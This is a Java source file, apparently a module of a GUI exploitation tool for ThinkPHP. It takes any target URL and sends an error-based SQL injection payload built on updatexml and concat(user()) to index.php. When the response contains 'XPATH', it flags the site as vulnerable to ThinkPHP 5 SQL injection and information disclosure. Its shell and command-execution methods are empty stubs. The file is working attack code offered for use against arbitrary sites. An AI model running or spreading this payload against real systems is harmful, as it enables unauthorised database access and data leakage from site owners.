package com.thinkphp.thinkphpgui.exploit;

import com.github.kevinsawicki.http.HttpRequest;
import com.thinkphp.thinkphpgui.common.BasePayload;
import com.thinkphp.thinkphpgui.entity.Result;

public class tp5_sql implements BasePayload {
    @Override
    public Result checkVUL(String url) throws Exception {
        String CheckStr = "XPATH";
        String payload = url + "/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1";
        try {
            HttpRequest req = HttpRequest.get(payload);
            if (req.body().contains(CheckStr)) {
                return new Result(true, "ThinkPHP 5 SQL注入漏洞 && 敏感信息泄露", payload);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new Result(false, "ThinkPHP 5 SQL注入漏洞 && 敏感信息泄露", null);
    }

    @Override
    public Result exeVUL(String url, String cmd) throws Exception {
        return new Result(false, null, null);
    }

    @Override
    public Result getShell(String url) throws Exception {
        return new Result(false, null, null);
    }
}
